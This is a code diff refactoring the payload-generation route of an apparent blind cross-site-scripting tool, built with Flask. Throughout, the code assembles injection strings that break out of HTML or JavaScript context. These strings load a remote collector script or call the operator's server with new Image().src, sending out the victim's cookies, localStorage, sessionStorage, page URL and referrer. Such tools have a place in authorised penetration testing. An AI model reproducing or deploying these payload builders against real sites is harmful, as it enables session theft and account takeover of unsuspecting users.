@@ -3,7 +3,8 @@ import json
 
 from app import db
 from app.api.models import (
-    DATA_TO_GATHER,
+    CodeType,
+    DataToGather,
     GenerateXssPayloadModel,
     GetAllXssLootModel,
     GetAllXssModel,
@@ -22,7 +23,8 @@ xss_bp = Blueprint("xss", __name__, url_prefix="/api/xss")
 def generate_xss_payload(body: GenerateXssPayloadModel):
     client: Client = db.first_or_404(db.select(Client).filter_by(id=body.client_id))
 
-    if body.code_type == "html":
+    if body.code_type == CodeType.HTML:
+        # if payload requires stager
         if set(body.to_gather) & {"fingerprint", "dom", "screenshot"} or body.custom_js:
             payload_head = f'\'>"><script src={body.url}/static/collector.min.js data="'
 
@@ -30,35 +32,26 @@ def generate_xss_payload(body: GenerateXssPayloadModel):
 
             payload_tail = '"></script>'
 
-            payload = payload_head + payload_body + payload_tail
-            return {"payload": payload}
-
+        # else if payload requires javascript, but no stager
         elif set(body.to_gather) & {"local_storage", "session_storage", "cookies", "origin_url", "referrer"}:
             payload_head = f'\'>"><script>new Image().src="{body.url}/api/x/{body.xss_type}/{client.uid}?'
 
-            tags_query_param, joined_and_trimmed_selected_payloads = _generate_js_grabber_payload_elements(body)
-
-            payload_body = "&".join([tags_query_param, joined_and_trimmed_selected_payloads]) if tags_query_param else joined_and_trimmed_selected_payloads
+            tags = _generate_tags_payload_elements(body)
+            js_grabbers = _generate_js_grabbers_payload_elements(body)
+            payload_body = "&".join([tags, js_grabbers]) if tags else js_grabbers
 
             payload_tail = "</script>"
 
-            payload = payload_head + payload_body + payload_tail
-            return {"payload": payload}
-
+        # else no javascript required
         else:
             payload_head = f'\'>"><img src="{body.url}/api/x/{body.xss_type}/{client.uid}'
 
-            joined_tags = ",".join(body.tags)
-            tags_query_param = f"tags={joined_tags}" if joined_tags else ""
-
-            payload_body = f"?{tags_query_param}" if tags_query_param else ""
+            tags = _generate_tags_payload_elements(body)
+            payload_body = f"?{tags}" if tags else ""
 
             payload_tail = '" />'
-
-            payload = payload_head + payload_body + payload_tail
-            return {"payload": payload}
-
     else:
+        # if payload requires stager
         if set(body.to_gather) & {"fingerprint", "dom", "screenshot"} or body.custom_js:
             payload_head = f';}};var js=document.createElement("script");js.src="{body.url}/static/collector.min.js";js.setAttribute("data", "'
 
@@ -66,41 +59,44 @@ def generate_xss_payload(body: GenerateXssPayloadModel):
 
             payload_tail = '");document.body.appendChild(js);'
 
-            payload = payload_head + payload_body + payload_tail
-            return {"payload": payload}
-
+        # else no stager required
         else:
             payload_head = f';}};new Image().src="{body.url}/api/x/{body.xss_type}/{client.uid}'
 
-            tags_query_param, joined_and_trimmed_selected_payloads = _generate_js_grabber_payload_elements(body)
-
-            if tags_query_param and joined_and_trimmed_selected_payloads:
-                joined_payload_data = "&".join([tags_query_param, joined_and_trimmed_selected_payloads])
-            elif tags_query_param:
-                joined_payload_data = f'{tags_query_param}"'
-            elif joined_and_trimmed_selected_payloads:
-                joined_payload_data = joined_and_trimmed_selected_payloads
+            tags = _generate_tags_payload_elements(body)
+            to_grab = _generate_js_grabbers_payload_elements(body)
+            if tags and to_grab:
+                joined_payload_data = "&".join([tags, to_grab])
+            elif tags:
+                joined_payload_data = f'{tags}"'
+            elif to_grab:
+                joined_payload_data = to_grab
             else:
-                joined_payload_data = '"'
-
-            payload_body = f"?{joined_payload_data}" if joined_payload_data else ""
+                joined_payload_data = ""
+            payload_body = f"?{joined_payload_data}" if joined_payload_data else '"'
 
             payload_tail = ";"
-            payload = payload_head + payload_body + payload_tail
-            return {"payload": payload}
+
+    payload = payload_head + payload_body + payload_tail
+    return {"payload": payload}
 
 
 def _generate_collector_payload_body(body: GenerateXssPayloadModel, client: Client) -> str:
-    data_to_exclude = sorted(DATA_TO_GATHER - set(body.to_gather))
+    data_to_exclude = sorted(set(e.value for e in DataToGather) - set(body.to_gather))
     joined_data_to_exclude = ";".join(data_to_exclude)
     joined_tags = ";".join(body.tags)
     joined_payload_data = ",".join([body.xss_type, client.uid, joined_data_to_exclude, joined_tags, body.custom_js])
 
-    payload_body = base64.b64encode(str.encode(joined_payload_data)).decode()
+    payload_body = base64.b64encode(joined_payload_data.encode()).decode()
     return payload_body
 
 
-def _generate_js_grabber_payload_elements(body: GenerateXssPayloadModel) -> tuple[str, str]:
+def _generate_tags_payload_elements(body: GenerateXssPayloadModel) -> str:
+    joined_tags = ",".join(body.tags)
+    return f"tags={joined_tags}" if joined_tags else ""
+
+
+def _generate_js_grabbers_payload_elements(body: GenerateXssPayloadModel) -> str:
     js_grabbers = {
         "cookies": 'cookies="+encodeURIComponent(document.cookie)+"',
         "local_storage": 'local_storage="+encodeURIComponent(JSON.stringify(localStorage))+"',
@@ -109,12 +105,10 @@ def _generate_js_grabber_payload_elements(body: GenerateXssPayloadModel) -> tupl
         "referrer": 'referrer="+encodeURIComponent(document.referrer)+"',
     }
 
-    joined_tags = ",".join(body.tags)
-    tags_query_param = f"tags={joined_tags}" if joined_tags else ""
     selected_payloads = [v for k, v in js_grabbers.items() if k in body.to_gather]
     joined_and_trimmed_selected_payloads = "&".join(selected_payloads).rstrip('+"')
 
-    return tags_query_param, joined_and_trimmed_selected_payloads
+    return joined_and_trimmed_selected_payloads
 
 
 @xss_bp.route("/<int:xss_id>", methods=["GET"])
